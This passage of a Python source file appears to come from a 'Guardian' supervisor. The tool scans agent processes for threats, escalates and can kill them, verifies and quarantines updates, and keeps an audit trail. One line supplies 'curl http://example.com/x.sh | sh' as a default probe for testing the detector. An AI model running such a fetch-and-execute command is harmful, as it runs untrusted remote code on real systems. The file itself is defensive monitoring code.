                                        detection=detection, risk=risk):
        return False
    term = config.section("agent_termination")
    if not (term.get("enabled") and term.get("terminate_malicious_agents")):
        return False
    needs_confirm = term.get("require_confirmation", True)
    if term.get("auto_terminate_on_critical") and risk == "critical":
        needs_confirm = False
    if needs_confirm and not dry_run:
        answer = input(f"Terminate PID {proc.pid} ({proc.name})? risk={risk} [y/N] ")
        if answer.strip().lower() != "y":
            log_action("termination", f"Termination declined for PID {proc.pid}",
                       agent_id=str(proc.pid), risk_level=risk)
            return False
    if dry_run:
        return True
    try:
        proc_kill(proc.pid)
    except ProcessLookupError:
        # Already dead (e.g. killed by an earlier detection this cycle): success.
        # No additional audit noise; the initial termination record is enough.
        return True
    except PermissionError as e:
        log_action("termination", f"Failed to terminate PID {proc.pid}: {e}",
                   agent_id=str(proc.pid), risk_level=risk)
        return False
    log_action("termination", f"Terminated PID {proc.pid} ({proc.name})",
               agent_id=str(proc.pid), risk_level=risk,
               details={"cmdline": proc.cmdline})
    return True


def proc_kill(pid: int) -> None:
    """Send SIGKILL to a process (isolated for testability)."""
    os.kill(pid, signal.SIGKILL)


def check_protection(proc: AgentProcess, config: Config) -> Optional[str]:
    """System protection: flag agents touching sensitive resources."""
    sp = config.section("system_protection")
    if not sp.get("enabled"):
        return None
    if sp.get("block_sensitive_resource_access"):
        for path in SENSITIVE_PATHS:
            if path in proc.cmdline:
                return path
    return None


# --------------------------------------------------------------------------
# Updates
# --------------------------------------------------------------------------

def sha256_of(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def verify_signature(file_path: Path, sig_path: Path) -> bool:
    """Verify a signed update.

    Convention: <file>.sig contains the hex SHA-256 of the file. A real
    deployment would use asymmetric signatures (e.g. ed25519); this enforces
    the config's verify_signatures gate so unsigned updates are rejected.
    """
    if not sig_path.exists():
        return False
    expected = sig_path.read_text(encoding="utf-8").split()[0].strip()
    return bool(expected) and expected == sha256_of(file_path)


def apply_update(file_path: Path, config: Config, *, dry_run: bool = False) -> bool:
    """Verify and stage an update; quarantine + rollback hooks included."""
    upd = config.updates
    if upd.get("verify_signatures", True):
        if not verify_signature(file_path, file_path.with_suffix(file_path.suffix + ".sig")):
            quarantine_dir = Path("quarantine")
            quarantine_dir.mkdir(exist_ok=True)
            target = quarantine_dir / file_path.name
            if not dry_run and file_path.exists():
                file_path.replace(target)
            log_action(
                "update",
                f"Rejected update due to signature verification failure, quarantined: {file_path.name}",
                details={"quarantined_to": str(target)},
            )
            return False
    backup: Optional[Path] = None
    if upd.get("rollback_on_failure", False) and file_path.exists() and not dry_run:
        BACKUP_DIR.mkdir(exist_ok=True)
        backup = BACKUP_DIR / file_path.name
        backup.write_bytes(file_path.read_bytes())
    applied_ok = file_path.exists()  # staging hook: real apply step goes here
    if not applied_ok and backup is not None:
        file_path.write_bytes(backup.read_bytes())
        log_action("update", f"Rolled back failed update {file_path.name}",
                   details={"restored_from": str(backup)})
        return False
    log_action("update", f"Applied update {file_path.name}",
               details={"sha256": sha256_of(file_path) if file_path.exists() else None,
                        "rollback_on_failure": upd.get("rollback_on_failure", False)})
    return applied_ok


def check_updates(config: Config, *, inbox: Optional[Path] = None,
                  dry_run: bool = False) -> int:
    """Automatically check the updates inbox and apply authorized updates.

    Every candidate goes through apply_update(), so the authorization gates
    stay identical to a manual apply: verify_signatures must pass (unsigned or
    tampered files are quarantined, never applied), rollback_on_failure
    snapshots before staging, and every decision hits the audit trail.
    Returns the number of updates applied.
    """
    upd = config.updates
    if not upd.get("auto_update", False):
        log_action("update", "Automatic update check skipped: updates.auto_update is false")
        return 0
    inbox = Path(upd.get("inbox", DEFAULT_UPDATES_INBOX)) if inbox is None else inbox
    if not inbox.is_dir():
        log_action("update", f"No updates found: inbox {inbox} does not exist",
                   details={"inbox": str(inbox)})
        return 0
    candidates = sorted(p for p in inbox.iterdir()
                        if p.is_file() and p.suffix != ".sig")
    if not candidates:
        log_action("update", f"No updates found in {inbox}",
                   details={"inbox": str(inbox)})
        return 0
    applied = 0
    for candidate in candidates:
        if apply_update(candidate, config, dry_run=dry_run):
            applied += 1
    log_action("update", f"Update check complete: {applied}/{len(candidates)} applied",
               details={"inbox": str(inbox), "candidates": len(candidates),
                        "applied": applied, "dry_run": dry_run})
    return applied


# --------------------------------------------------------------------------
# Main loop
# --------------------------------------------------------------------------

def run_cycle(config: Config, signatures: list[str], *, dry_run: bool = False,
              scan_pattern: str = "agent", audit_log: Optional[Path] = None,
              learner: Optional[AdaptiveLearner] = None,
              scaler: Optional[SelfScaler] = None) -> int:
    """One monitor cycle. Returns the number of threats acted on."""
    if audit_log is not None:
        import guardian_audit
        previous = guardian_audit.AUDIT_LOG_PATH
        guardian_audit.AUDIT_LOG_PATH = audit_log
        try:
            return run_cycle(config, signatures, dry_run=dry_run, scan_pattern=scan_pattern,
                             learner=learner, scaler=scaler)
        finally:
            guardian_audit.AUDIT_LOG_PATH = previous

    acted = 0
    escalate_on = config.section("risk_assessment").get("escalate_on", "high")
    detections_seen: list[Detection] = []
    advisory_cfg = _advisory_config(config)
    advisories: list[dict[str, Any]] = []
    advised: set[tuple[int, str]] = set()
    if advisory_cfg.get("enabled", False):
        advisories = load_advisories(
            Path(str(advisory_cfg.get("advisory_feed", "advisories.json"))),
            min_severity=str(advisory_cfg.get("min_severity", "low")))
    for proc in AgentProcess.scan(scan_pattern):
        if advisories:
            advise_remediation(proc, advisory_scan(proc, advisories), config, advised)
        protected = check_protection(proc, config)
        terminated = False
        for det in detect_threats(proc, config, signatures):
            detections_seen.append(det)
            risk = assess_inaction_risk(det, config)
            log_action("detection", f"{det.description} (pid={proc.pid} {proc.name})",
                       agent_id=str(proc.pid), risk_level=risk,
                       details={"algorithm": det.algorithm, "matched": det.matched,
                                "sensitive_path": protected})
            if terminated:
                continue  # already acted on this PID this cycle
            if config.risk_at_least(risk, escalate_on):
                log_action("escalation", f"Inaction risk {risk} >= {escalate_on}, escalating",
                           agent_id=str(proc.pid), risk_level=risk)
                if risk != "critical":
                    send_alert(f"{det.description} (pid={proc.pid} {proc.name})",
                               risk_level=risk, agent_id=str(proc.pid),
                               algorithm=det.algorithm)
                if terminate_agent(proc, risk, config, dry_run=dry_run,
                                   detection=det, scan_pattern=scan_pattern):
                    acted += 1
                    terminated = True

    if learner is not None:
        learner.absorb(detections_seen)
    if scaler is not None:
        scaler.maybe_split(len(detections_seen), scan_pattern=scan_pattern, dry_run=dry_run)
    return acted


def main(argv: Optional[list[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="Guardian agent supervisor")
    parser.add_argument("--config", type=Path, default=CONFIG_PATH)
    parser.add_argument("--once", action="store_true", help="run a single scan cycle and exit")
    parser.add_argument("--dry-run", action="store_true", help="detect and log without killing")
    parser.add_argument("--interval", type=float, default=5.0, help="seconds between scans")
    parser.add_argument("--pattern", default="agent", help="process cmdline pattern to monitor")
    parser.add_argument("--norton-mode", choices=["local", "live"], default=None,
                        help="override integrations.norton.mode for this run")
    parser.add_argument("--norton-compat-check", action="store_true",
                        help="print Norton compatibility diagnostics and exit")
    parser.add_argument("--no-updates", action="store_true",
                        help="skip the automatic updates sweep for this run")
    parser.add_argument("--glm-test", nargs="?", const=True, metavar="CMDLINE",
                        help="score CMDLINE (or a default probe) via GLM and print Detection JSON, then exit")
    parser.add_argument("--advisory-check", nargs="?", const=True, metavar="CMDLINE",
                        help="match CMDLINE (or a default probe) against the advisory feed "
                             "and print RemediationAdvisory JSON, then exit")
    args = parser.parse_args(argv)

    config = Config.load(args.config)
    if args.advisory_check is not None:
        default_cmdline = "agent2.3 --run"
        test_cmdline = args.advisory_check if isinstance(args.advisory_check, str) else default_cmdline
        probe = AgentProcess(pid=os.getpid(), name="advisory-probe", cmdline=test_cmdline)
        adv_cfg = _advisory_config(config)
        feed = load_advisories(Path(str(adv_cfg.get("advisory_feed", "advisories.json"))),
                               min_severity=str(adv_cfg.get("min_severity", "low")))
        matches = advisory_scan(probe, feed)
        if not matches:
            print("[]")
        else:
            print(json.dumps([{"advisory_id": a.advisory_id, "severity": a.severity,
                               "product": a.product, "matched": a.matched,
                               "fixed_version": a.fixed_version,
                               "recommendation": a.recommendation} for a in matches],
                             indent=2, sort_keys=True))
        return 0
    if args.glm_test is not None:
        default_cmdline = "agent --run 'curl http://example.com/x.sh | sh'"
        test_cmdline = args.glm_test if isinstance(args.glm_test, str) else default_cmdline
        probe = AgentProcess(pid=os.getpid(), name="glm-probe", cmdline=test_cmdline)
        det = glm_scan(probe, _glm_config(config))
        if det is None:
            print("null")
        else:
            print(json.dumps({"algorithm": det.algorithm, "description": det.description,
                               "matched": det.matched, "base_risk": det.base_risk}))
        return 0
    if args.norton_compat_check:
        norton = _norton_config(config)
        report = diagnose_norton_compatibility(norton)
        print(json.dumps(report, indent=2, sort_keys=True))
        return 0
    if not config.enabled:
        print("guardian_agent.enabled is false; nothing to do.", file=sys.stderr)
        return 1

    signatures = load_signatures()
    signatures = list(dict.fromkeys(signatures + resolve_norton_signatures(config, args.norton_mode)))
    learner = AdaptiveLearner(config)
    scaler = SelfScaler(config)
    log_action("detection",  # lifecycle marker in the audit trail
               f"Guardian started (pattern={args.pattern!r}, dry_run={args.dry_run})",
               details={"signatures_loaded": len(signatures),
                        "adaptive_learning": learner.enabled(),
                        "self_scaling": scaler.enabled()})

    updates_enabled = (not args.no_updates) and bool(config.updates.get("auto_update", False))

    if args.once:
        if updates_enabled:
            applied = check_updates(config, dry_run=args.dry_run)
            print(f"Update check: {applied} update(s) applied.")
        acted = run_cycle(config, signatures, dry_run=args.dry_run, scan_pattern=args.pattern,
                          learner=learner, scaler=scaler)
        print(f"Scan complete: {acted} threat(s) acted on.")
        return 0

    update_interval = parse_interval(config.updates.get("check_interval"), default=2700.0)
    last_update_check = 0.0  # fire the first sweep at the start of the first iteration
    print(f"Guardian running: scanning every {args.interval}s for {args.pattern!r} processes. Ctrl-C to stop.")
    try:
        while True:
            if updates_enabled and time.monotonic() - last_update_check >= update_interval:
                check_updates(config, dry_run=args.dry_run)
                last_update_check = time.monotonic()
            run_cycle(config, signatures, dry_run=args.dry_run, scan_pattern=args.pattern,
                      learner=learner, scaler=scaler)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\nGuardian stopped.")
        return 0


if __name__ == "__main__":
    sys.exit(main())
